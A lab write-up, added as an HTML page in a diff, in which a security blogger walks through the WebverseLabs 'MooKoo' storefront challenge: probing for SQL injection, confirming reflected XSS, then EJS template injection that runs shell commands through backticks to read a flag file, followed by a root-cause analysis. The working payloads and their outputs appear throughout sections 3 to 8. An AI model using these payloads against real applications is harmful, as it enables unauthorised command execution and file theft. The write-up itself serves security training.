@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 64 64%27><rect width=%2764%27 height=%2764%27 rx=%2712%27 fill=%27%2306080f%27/><path d=%27M16 18L30 32L16 46%27 stroke=%27%2300d9ff%27 stroke-width=%276%27 fill=%27none%27 stroke-linecap=%27round%27 stroke-linejoin=%27round%27/><rect x=%2734%27 y=%2742%27 width=%2716%27 height=%276%27 rx=%272%27 fill=%27%2300ff9d%27/></svg>">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MooKoo Family Farm Writeup // 7s26simon</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;family=JetBrains+Mono:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../css/style.css">
+    <link rel="stylesheet" type="text/css" href="../css/style-writeup.css">
+</head>
+
+<body>
+
+    <header id="top-bar-blue">
+        <h1 id="name-font">Simon McCabe</h1>
+        <p class="certs">OSCP &middot; OSWP &middot; PWPP &middot; PWPA &middot; PAPA &middot; EnCE &middot; Linux+ &middot; LPIC-1 &middot; Network+ &middot; Security+ &middot; Pentest+ &middot; eJPT &middot; eWPT &middot; BSc &middot; PGCert</p>
+    </header>
+
+    <nav class="topnav">
+        <a href="../index.html">home</a>
+        <div class="topnav-dropdown active">
+            <a href="#" class="topnav-dropdown-toggle" aria-haspopup="true">writeups</a>
+            <div class="topnav-dropdown-menu" role="menu">
+                <a href="../hackthebox.html">hackthebox</a>
+                <a href="../tryhackme.html">tryhackme</a>
+                <a href="../vulnhub.html">vulnhub</a>
+                <a href="../bugforge.html">bugforge</a>
+                <a class="active" href="../webverse.html">webverse</a>
+            </div>
+        </div>
+        <a href="../general.html">blog</a>
+        <a href="../quicklinks.html">quick links</a>
+        <a href="../About.html">about</a>
+    </nav>
+
+    <div id="writeup-box-name">
+        <p>MooKoo - HTML Injection &rarr; Reflected XSS &rarr; SSTI &rarr; RCE</p>
+    </div>
+
+    <div id="marg-asthetic">
+
+        <p>
+            <strong>Platform:</strong> WebverseLabs<br>
+            <strong>Target:</strong> <code>https://4828ab0c-3953-mookoo-2bbf6.events.webverselabs-pro.com</code><br>
+            <strong>Vulnerability classes:</strong> Reflected XSS, Server-Side Template Injection (SSTI), RCE
+        </p>
+
+        <h2>1. Overview</h2>
+
+        <img src="./images/mookoo/main.png" alt="MooKoo Family Farm homepage">
+
+        <p>MooKoo Family Farm is a small "closing-down sale" storefront where each animal on the farm is listed as a product. The site is intentionally written like a quickly-thrown-together shop front (per the lab brief), and the <code>product</code> query parameter on the product detail page turns out to be the single point of entry for the whole chain: a reflected XSS that masks a server-side template injection sink, which in turn allows arbitrary OS command execution.</p>
+
+
+        <h2>2. Application Map</h2>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Path</th>
+                    <th>Method</th>
+                    <th>Notes</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>/</code></td>
+                    <td>GET</td>
+                    <td>Landing page, herd grid, links to <code>/product?product=&lt;slug&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><code>/about</code></td>
+                    <td>GET</td>
+                    <td>Static "Our story" page, no user input</td>
+                </tr>
+                <tr>
+                    <td><code>/product?product=&lt;slug&gt;</code></td>
+                    <td>GET</td>
+                    <td>Product detail page. Valid slugs: <code>bessie</code>, <code>dakota</code>, <code>clover</code>, <code>woolly</code>, <code>henrietta</code>, <code>hampton</code>, <code>gandalf</code>, <code>drake</code></td>
+                </tr>
+                <tr>
+                    <td><code>/style.css</code>, <code>/img/*</code>, fonts</td>
+                    <td>GET</td>
+                    <td>Static assets</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <p>After landing on the page, I could see that the "Make an offer" button on each product page is a disabled GET form pointing back at <code>/product?product=&lt;slug&gt;</code> - a dead end, not an additional input vector.</p>
+
+        <p>The only attacker-controlled input anywhere on the site is the <code>product</code> query parameter.</p>
+
+
+        <h2>3. Initial Recon - Ruling Out SQL Injection</h2>
+
+        <img src="./images/mookoo/shop.png" alt="MooKoo shop page">
+
+        <p>The <code>/product</code> endpoint returns a friendly "not found" page for any slug it doesn't recognise, and that page echoed the requested value back.</p>
+
+        <img src="./images/mookoo/bessie.png" alt="Bessie product page">
+
+        <p>The obvious thing to try was SQL injection. The following payloads were tried against the <code>product</code> parameter:</p>
+
+        <img src="./images/mookoo/sqli.png" alt="SQLi attempts in Burp">
+
+        <ul>
+            <li><code>bessie'</code></li>
+            <li><code>bessie'-- -</code></li>
+            <li><code>' OR '1'='1</code></li>
+            <li><code>bessie' OR '1'='1'-- -</code></li>
+        </ul>
+
+        <p>In every case the response was a "not found" page with the raw payload reflected verbatim. There were no SQL errors.</p>
+
+
+        <h2>4. Finding #1 - Reflected XSS</h2>
+
+        <p>While ruling out SQLi, it became clear that the "not found" message reflects <code>product</code> completely unescaped into the HTML body:</p>
+
+<pre class="code-view-two">GET /product?product=&lt;h1&gt;test&lt;/h1&gt;&lt;h2&gt;html&lt;/h2&gt;&lt;h3&gt;injection&lt;/h3&gt;</pre>
+
+        <p>returned:</p>
+
+        <img src="./images/mookoo/htmlinjection.png" alt="HTML injection result">
+
+        <p>Confirmed with a full script tag:</p>
+
+<pre class="code-view-two">GET /product?product=&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+
+        <p>returned:</p>
+
+        <img src="./images/mookoo/rxss.png" alt="Reflected XSS alert firing">
+
+        <p>The response carried no Content-Security-Policy (CSP) header (only the legacy, largely-ignored <code>X-XSS-Protection: 1; mode=block</code>), so this executes in any modern browser. On its own this is a reflected XSS - but the more interesting question was <em>why</em> the fallback path reflects raw input at all. That question led directly to the next finding.</p>
+
+
+        <h2>5. Finding #2 - Server-Side Template Injection</h2>
+
+        <p>The "X not found" fallback behaviour suggested the application might be attempting to <em>render</em> the <code>product</code> value as a template fragment before falling back to raw reflection on error. Standard Jinja2/Twig-style syntax was tried first and failed:</p>
+
+<pre class="code-view-two">GET /product?product={{7*7}}
+returned: {{7*7}} not found</pre>
+
+        <p>EJS-style delimiters were tried next (from PayloadAllTheThings):</p>
+
+        <img src="./images/mookoo/EJS.png" alt="EJS SSTI payload in Burp">
+
+<pre class="code-view-two">GET /product?product=&lt;%= 7*7 %&gt;
+returned: 49 not found</pre>
+
+        <p>This confirmed SSTI. The <code>product</code> value is being injected into the <em>source</em> of a template, not passed as data to a pre-compiled one.</p>
+
+
+        <h2>6. Finding #3 - RCE via Backtick Command Execution</h2>
+
+        <p>The evaluator treated backtick-delimited content as a shell command rather than (or in addition to) a JS template literal:</p>
+
+<pre class="code-view-two">GET /product?product=&lt;%= `id` %&gt;
+returned: uid=1100(farmhand) gid=999(farm) groups=999(farm)</pre>
+
+        <p>This is full, unauthenticated remote code execution as the <code>farmhand</code> user. Reading the flag was then trivial:</p>
+
+<pre class="code-view-two">GET /product?product=&lt;%= `cat /flag.txt` %&gt;</pre>
+
+        <p class="shellbyte">Flag: WEBVERSE{70b460XXXXXXXXXXXXXXXXXXXXXXXXXX}</p>
+
+
+        <h2>7. Root Cause Analysis</h2>
+
+        <p>Two independent mistakes compound into RCE:</p>
+
+        <ol>
+            <li>User input is treated as template source, not template data - the delimiters are recognised and evaluated even though they came straight from the query string. This is the textbook definition of SSTI.</li>
+            <li>Backtick-quoted strings convert the SSTI into unrestricted OS command execution.</li>
+        </ol>
+
+        <p>On top of that, output is never HTML-encoded on either the success or failure path, which is what produced the reflected XSS in Finding #1 and made the SSTI easier to spot in the first place.</p>
+
+
+        <h2>8. Summary</h2>
+
+        <p>HTML injection led to reflected XSS, which the lab description said could end up resulting in an SSTI vulnerability because we could get the page to render our input.</p>
+        <p>This was a great lab to show how one vulnerability that doesn't seem too harmful at first glance can end up resulting in something serious if you're inquisitive enough to continue poking at it. The following is a quick summary of the core findings:
+        
+        <p>Note: URL decoded payloads to help explain.</p>
+<pre class="code-view-two"># Confirm SSTI (arithmetic evaluation)
+GET /product?product=&lt;%= 7*7 %&gt;
+returns: "49 not found"
+
+# Confirm RCE
+GET /product?product=&lt;%= `id` %&gt;
+returns: "uid=1100(farmhand) gid=999(farm) groups=999(farm)"
+
+# Read the flag
+GET /product?product=&lt;%= `cat /flag.txt` %&gt;
+returns: WEBVERSE{flag_redacted}</pre>
+
+    </div>
+
+    <section id="social-media">
+        <a class="logoWidth" href="https://www.linkedin.com/in/simonmccabe1/" target="_blank" rel="noopener" aria-label="LinkedIn"><img src="../images/linkedin.PNG" alt="LinkedIn"></a>
+        <a class="logoWidth" href="https://x.com/7s26simon" target="_blank" rel="noopener" aria-label="X / Twitter"><img src="../images/twitter.PNG" alt="X"></a>
+        <a class="logoWidth" href="https://www.youtube.com/@7s26simon" target="_blank" rel="noopener" aria-label="YouTube"><img src="../images/youtube.PNG" alt="YouTube"></a>
+        <a class="logoWidth" href="https://github.com/7s26simon" target="_blank" rel="noopener" aria-label="GitHub"><img src="../images/github.PNG" alt="GitHub"></a>
+    </section>
+
+    <footer id="bottom-bar">
+        <div id="validator">
+            <p id="footerTag">© 2026 Simon McCabe &middot; 7s26simon.github.io</p>
+        </div>
+    </footer>
+
+</body>
+</html>
